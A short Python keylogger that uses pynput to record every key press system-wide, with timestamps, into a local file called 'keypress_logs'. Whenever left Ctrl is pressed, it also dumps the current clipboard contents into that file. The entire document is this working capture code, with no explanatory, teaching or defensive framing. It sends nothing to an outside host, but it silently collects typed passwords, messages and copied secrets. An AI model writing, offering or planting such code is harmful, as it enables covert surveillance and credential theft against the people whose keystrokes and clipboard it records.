from pynput.keyboard import Key
from pynput import keyboard
import pyperclip as pc
from datetime import datetime

def press_event(key):
    f = open("keypress_logs", 'a')
    if key == Key.ctrl_l:
        f.write(f"Clipboard content on {datetime.now()}: {pc.paste()}\n")
    else:
        f.write(f"Alphanumeric key pressed on {datetime.now()}: {key}\n")

with keyboard.Listener(on_press = press_event,) as listener:
    listener.join()
